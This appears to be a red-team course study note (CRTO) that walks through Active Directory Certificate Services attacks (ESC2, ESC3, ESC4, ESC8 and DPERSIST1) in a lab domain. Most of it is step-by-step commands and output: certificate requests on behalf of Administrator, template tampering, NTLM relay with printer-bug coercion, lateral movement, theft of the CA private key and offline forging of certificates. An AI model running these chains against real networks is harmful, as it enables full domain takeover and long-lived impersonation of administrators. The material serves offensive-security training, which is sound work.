# CRTO — ADCS: ESC2, ESC3, ESC4, ESC8 & DPERSIST1

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Section:** Active Directory Certificate Services
**Objective:** Identify and exploit multiple ADCS misconfigurations for privilege escalation and domain persistence

---

## ADCS Attack Overview

| Technique | Type | Requires | Result |
|---|---|---|---|
| ESC1 | Template misconfiguration | Any domain user | DA TGT via arbitrary SAN |
| ESC2 | Template misconfiguration | Any domain user | Any-purpose cert → use as ESC3 or ESC1 |
| ESC3 | Template misconfiguration | Any domain user | Cert Request Agent → cert on behalf of any user |
| ESC4 | Template ACL abuse | Write rights on template | Modify template to ESC1, then exploit |
| ESC8 | NTLM relay to HTTP endpoint | MITM / coercion position | DC cert via relay → S4U2Self to DA |
| DPERSIST1 | CA key theft | DA + access to CA server | Golden Certificate — forge certs offline indefinitely |

---

## ESC2 — Any Purpose EKU

**TTP:** T1649 — Steal or Forge Authentication Certificates

### What Is ESC2?

A certificate template with the **Any Purpose EKU** (or blank/empty EKUs, treated as Subordinate CA) can be used in place of any other EKU — including Client Authentication. The resulting certificate has no functional restriction.

### Enumerate

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

**ESC2 indicators in output:**
```
Extended Key Usage        : Any Purpose
Certificate Application Policies : Any Purpose
Manager Approval Required : False
Enrollment Rights         : CONTOSO\Domain Users
```

### Exploit

Since the cert can be used for any purpose, ESC2 is exploited the same way as ESC3 (use it as a Certificate Request Agent):

```bash
# Step 1 — Request ESC2 cert (any purpose)
execute-assembly Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC2 --quiet

# Step 2 — Use ESC2 cert as agent to request cert on behalf of Administrator
execute-assembly Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx [ESC2 CERT] --quiet

# Step 3 — PKINIT → DA TGT
execute-assembly Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```

> If `ENROLLEE_SUPPLIES_SUBJECT` is also enabled on the ESC2 template, exploit it as ESC1 instead — request cert with arbitrary SAN directly.

---

## ESC3 — Certificate Request Agent EKU

**TTP:** T1649 — Steal or Forge Authentication Certificates

### What Is ESC3?

A template with the **Certificate Request Agent EKU** allows the certificate holder to sign certificate requests **on behalf of other users**. This is a two-step attack:

1. Request a cert from the ESC3 template (gets you Certificate Request Agent capability)
2. Use that agent cert to request a cert from another template (e.g. `User`) **as Administrator**

### Enumerate

```bash
execute-assembly Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

**ESC3 indicators:**
```
Extended Key Usage                : Certificate Request Agent
Certificate Application Policies : Certificate Request Agent
Manager Approval Required         : False
Authorized Signatures Required    : 0
Enrollment Rights                 : CONTOSO\Domain Users
```

> `Authorized Signatures Required: 0` is critical — if this were non-zero, the agent cert would need to be co-signed, blocking the attack.

### Exploit — Two-Step Process

**Step 1 — Request Certificate Request Agent cert:**

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC3 \
  --quiet

# Output: Certificate (PFX): MIACAQ[...snip...]AAAAA=
# Current user context: CONTOSO\pchilds
```

**Step 2 — Use agent cert to request cert as Administrator:**

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template User \
  --target Administrator \
  --agent-pfx MIACAQ[...snip...]AAAAA= \
  --quiet

# Output: Certificate (PFX) for Administrator
```

**`request-agent` flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `--ca` | CA FQDN\Name | Target certificate authority |
| `--template` | `User` | Template to request from — must have Client Authentication EKU |
| `--target` | `Administrator` | User to impersonate in the on-behalf-of request |
| `--agent-pfx` | Base64 ESC3 cert | The Certificate Request Agent cert from Step 1 |

**Step 3 — PKINIT → DA TGT:**

```bash
execute-assembly Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:[ADMIN CERT] \
  /enctype:aes256 \
  /nowrap
```

### Why `User` Template for Step 2

The `User` template has **Client Authentication EKU** enabled — required for PKINIT. Any template with Client Authentication and no manager approval works. The agent cert from ESC3 acts as the authorization signature.

---

## ESC4 — Vulnerable Template ACL

**TTP:** T1649 — Steal or Forge Authentication Certificates
**TTP:** T1222 — File and Directory Permissions Modification

### What Is ESC4?

A low-privilege principal has write permissions on a certificate template, allowing them to **modify the template** and introduce ESC1-style vulnerabilities — then exploit those vulnerabilities.

### Dangerous Permissions

| Permission | What It Allows |
|---|---|
| `Owner` | Implicit full control of template |
| `FullControl` | Explicit full control |
| `WriteProperty` | Edit any template property |
| `WriteOwner` | Change template owner → gain full control |
| `WriteDacl` | Modify template ACL → grant yourself full control |

### Enumerate

```bash
execute-assembly Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

**ESC4 indicators:**
```
Vulnerabilities
  ESC4 : The template has insecure delegated permissions.
Object Control Permissions
  Write Owner   : CONTOSO\Domain Users
  Write Dacl    : CONTOSO\Domain Users
  Write Property : CONTOSO\Domain Users
```

The screenshot shows Domain Users has **Write** permission on the ESC4 template in the certificate template console — this is the ACL misconfiguration.

### Exploit — Modify Template, Then ESC1

**Step 1 — Add `ENROLLEE_SUPPLIES_SUBJECT` flag to the template:**

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template \
  --template ESC4 \
  --supply-subject \
  --quiet

# Output: Successfully modified the certificate template.
```

**Verify the flag was added:**

```bash
execute-assembly Certify.exe enum-templates --template ESC4 --quiet
# Certificate Name Flag : ENROLLEE_SUPPLIES_SUBJECT  ← confirmed
```

**Step 2 — Exploit as ESC1:**

```bash
# Client Auth EKU already enabled on ESC4 — just request with arbitrary SAN
execute-assembly Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC4 \
  --upn Administrator \
  --quiet

# Step 3 — PKINIT → DA TGT
execute-assembly Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```

**Other `manage-template` options:**

| Flag | Purpose |
|---|---|
| `--enroll <sid>` | Grant enrollment rights to a principal |
| `--manager-approval` | Toggle manager approval on/off |
| `--authorized-signatures 0` | Set required signatures to 0 |
| `--client-auth` | Toggle Client Authentication EKU |
| `--supply-subject` | Toggle ENROLLEE_SUPPLIES_SUBJECT flag |

> **Cleanup:** After exploitation, restore the template to its original state — remove `ENROLLEE_SUPPLIES_SUBJECT` with another `manage-template` call. Leaving the template modified is detectable and a security risk (*primum non nocere*).

---

## ESC8 — NTLM Relay to HTTP AD CS Endpoint

**TTP:** T1557 — Adversary-in-the-Middle
**TTP:** T1649 — Steal or Forge Authentication Certificates

### What Is ESC8?

AD CS web enrollment (`/certsrv/`) over HTTP without channel binding is vulnerable to NTLM relay. An attacker who can coerce a machine (e.g. a DC) to authenticate can relay those credentials to the CA's web enrollment endpoint and obtain a certificate as that machine account.

**Identify via Certify:**
```bash
execute-assembly Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

# ESC8 indicator:
# ESC8 : The CA supports HTTP web enrollment without channel binding.
# Legacy ASP Enrollment Website : http://lon-cs-1.contoso.com/certsrv/
```

The screenshot shows the `/certsrv/` web enrollment page — accessible over plain HTTP (not HTTPS with channel binding enforced).

### Setup — Port 445 Unbinding

Port 445 is bound by `srvnet.sys` and cannot be simply stopped. Three services must be stopped in order:

```bash
# 1. Reconfigure lanmanserver to DISABLED (prevents auto-restart)
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4

# 2. Stop services in dependency order
sc_stop lanmanserver
sc_stop srv2
sc_stop srvnet

# Verify 445 is unbound
netstat    # port 445 should no longer appear
```

> **WARNING:** Unbinding port 445 breaks ALL SMB-based services — file shares, SMB Beacons, lateral movement via SMB. Only do this on a machine where these services are non-critical. Plan your Beacon topology before starting.

### Setup — Reverse Port Forward

```bash
# Forward port 445 on target → attacker desktop Docker container on port 7445
rportfwd_local 445 localhost 7445

# Verify — port 445 now listening, PID is Beacon process (not System/PID 4)
netstat

# Start SOCKS proxy for ntlmrelayx to use
socks 1080 socks5
```

**`rportfwd_local` vs `rportfwd`:**

| Command | Forwards to |
|---|---|
| `rportfwd` | Team server (attacker IP via team server) |
| `rportfwd_local` | CS client machine (attacker desktop localhost) |

> Use `rportfwd_local` here because ntlmrelayx runs in Docker on the attacker desktop, not on the team server.

### Setup — ntlmrelayx in Docker

```bash
# Start Kali Docker container
docker container start -i kali-1

# Run ntlmrelayx via proxychains (routes back to target network through SOCKS)
proxychains impacket-ntlmrelayx \
  -t http://10.10.120.5/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `-t` | `http://[CA IP]/certsrv/certfnsh.asp` | Target — CA web enrollment endpoint |
| `-smb2support` | — | Support SMBv2 authentication |
| `--adcs` | — | AD CS relay mode — request certificate instead of standard relay |
| `--template` | `DomainController` | Template to request — must support DC authentication |

> `proxychains` routes ntlmrelayx's outbound requests through the SOCKS proxy → Beacon → target CA. The NTLM auth arrives from the DC via the reverse port forward.

### Trigger Coercion

```bash
# Coerce DC to authenticate to our machine (same PrinterBug technique as S4U2Self lab)
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
```

**Attack flow:**
```
SharpSpoolTrigger → DC authenticates to lon-ws-1 (our machine)
    ↓
NTLM auth arrives on port 445 → reverse port forward → Docker port 7445
    ↓
ntlmrelayx catches it → proxychains → SOCKS proxy → Beacon → CA /certsrv/
    ↓
CA issues DomainController certificate for LON-DC-1$
    ↓
ntlmrelayx saves LON-DC-1.pfx
```

**ntlmrelayx output on success:**
```
[*] (SMB): Authenticating connection from CONTOSO/LON-DC-1$@172.17.0.1 against http://10.10.120.5 SUCCEED
[*] http://CONTOSO/LON-DC-1$@10.10.120.5 → GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./LON-DC-1.pfx
```

### Post-Relay — S4U2Self to DA

With the DC machine cert:

```bash
# Request TGT for DC machine account
Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:LON-DC-1.pfx /enctype:aes256 /nowrap

# S4U2Self → get service ticket for Administrator → cifs/lon-dc-1
krb_s4u /ticket:[DC TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator

# Access DC
ls \\lon-dc-1\c$
```

### Cleanup After ESC8

```bash
# Restore lanmanserver start type (AUTO_START = 2)
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
sc_start lanmanserver

# Remove reverse port forward
rportfwd stop 445

# Stop SOCKS proxy
socks stop
```

---

## DPERSIST1 — Golden Certificate (CA Key Theft)

**TTP:** T1649 — Steal or Forge Authentication Certificates
**TTP:** T1552.004 — Unsecured Credentials: Private Keys

### What Is DPERSIST1?

If an attacker compromises the CA server and extracts its private key, they can **forge certificates offline indefinitely** — signed with the real CA key, indistinguishable from legitimately issued certificates. This is the ADCS equivalent of stealing the krbtgt hash for Golden Tickets.

**Why it's persistence:** The CA certificate's private key is never automatically rotated (like krbtgt). A stolen CA key is valid for the entire lifetime of the CA certificate — potentially decades.

### Step 1 — Move Laterally to CA Server

```bash
# CA server: lon-cs-1 (Tier 0 asset — requires DA or equivalent to access)
# Use standard lateral movement chain — impersonate DA, jump to lon-cs-1
make_token CONTOSO\[DA account] [password]
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump psexec64 lon-cs-1 smb
```

### Step 2 — Dump CA Certificate and Private Key

```bash
# From SYSTEM Beacon on lon-cs-1
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet

# Output: Certificate (PFX) — CONTOSO Root CA: MIACAQ[...snip...]AAAAA=
```

### Step 3 — Save to Attacker Desktop

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx", [Convert]::FromBase64String("MIACAQ[...snip...]AAAAA="))
```

### Step 4 — Forge Certificate Offline

Run on attacker desktop (no Beacon needed — fully offline):

```powershell
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge \
  --ca-cert .\Desktop\contoso-root-ca.pfx \
  --upn Administrator \
  --subject "CN=Administrator,CN=Users,DC=contoso,DC=com" \
  --sid S-1-5-21-3926355307-1661546229-813047887-500 \
  --crl "ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com" \
  --quiet
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `--ca-cert` | Path to stolen CA PFX | The CA's private key used to sign the forged cert |
| `--upn` | `Administrator` | UPN to embed in SAN — what PKINIT authenticates as |
| `--subject` | DN string | Certificate subject — cosmetic but should be realistic |
| `--sid` | Administrator SID | Embedded in cert for PAC generation |
| `--crl` | LDAP CRL path | Certificate Revocation List distribution point — must be valid |

**Certify output:**
```
CA Certificate Information:
  Subject    : CN=CONTOSO Root CA, DC=contoso, DC=com
  Thumbprint : 73B4B551DB60427D0CBD5D2E2658BCB2088F3F2C
  End Date   : 8/30/2125 11:29:39 AM   ← 100 year validity

Forged Certificate Information:
  SubjectAltName : Administrator
  Start Date     : 2/28/2026 2:33:47 PM
  End Date       : 2/28/2027 2:33:47 PM   ← 1 year forged cert validity
  Thumbprint     : EBE370DFB276BEEB209D690EEC38DC6F36181638
```

### Step 5 — Request TGT with Forged Certificate

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO \
  /certificate:[FORGED CERT BASE64] \
  /enctype:aes256 \
  /nowrap
```

> The KDC validates the certificate's signature against the trusted CA — since the forged cert is signed with the real CA key, it passes validation. The KDC issues a legitimate TGT for Administrator.

---

## ESC2/3/4/8/DPERSIST1 — Command Summary

```bash
# ESC2 — Any Purpose cert → use as ESC3
Certify.exe request --template ESC2 → request-agent --template User --target Administrator

# ESC3 — Certificate Request Agent → on-behalf-of request
Certify.exe request --template ESC3 → request-agent --template User --target Administrator

# ESC4 — Modify template → add ENROLLEE_SUPPLIES_SUBJECT → ESC1
Certify.exe manage-template --template ESC4 --supply-subject → request --template ESC4 --upn Administrator

# ESC8 — NTLM relay to /certsrv/ → DC cert → S4U2Self → DA
Unbind 445 → rportfwd_local 445 localhost 7445 → socks 1080 socks5 → ntlmrelayx → SharpSpoolTrigger

# DPERSIST1 — Steal CA key → forge certs offline indefinitely
manage-self --dump-certs → Certify.exe forge --ca-cert root-ca.pfx --upn Administrator
```

---

## MITRE ATT&CK Mapping

| TTP | Technique | ESC |
|---|---|---|
| T1649 | Steal or Forge Authentication Certificates | ESC1–4, ESC8, DPERSIST1 |
| T1557 | Adversary-in-the-Middle | ESC8 (NTLM relay) |
| T1552.004 | Unsecured Credentials: Private Keys | DPERSIST1 (CA key extraction) |
| T1222 | File and Directory Permissions Modification | ESC4 (template ACL abuse) |
| T1558.001 | Forge Kerberos Tickets | All — final TGT via PKINIT |

---

## Key Takeaways

- **ESC2** is exploited the same way as ESC3 — any-purpose cert acts as a certificate request agent
- **ESC3** is a two-step attack — agent cert first, then on-behalf-of request for the target user
- **ESC4** turns a template write permission into an ESC1 — always check `WriteProperty`/`WriteDacl`/`WriteOwner` on templates and restore after exploitation
- **ESC8** requires unbinding port 445 — this breaks SMB Beacons and file shares; plan your Beacon topology before attempting
- Use `rportfwd_local` (not `rportfwd`) for ESC8 — ntlmrelayx runs on the attacker desktop, not the team server
- **DPERSIST1** is the most powerful persistence technique in ADCS — the CA key never rotates, forged certs are cryptographically valid, and the only mitigation is to replace the entire CA infrastructure
- The `--crl` parameter in `Certify forge` must point to a valid CRL distribution point — an invalid CRL causes cert validation failures
- After DPERSIST1, rotate the CA's key material as a finding recommendation — there's no officially supported way to do this, which is why it's such a severe persistence mechanism
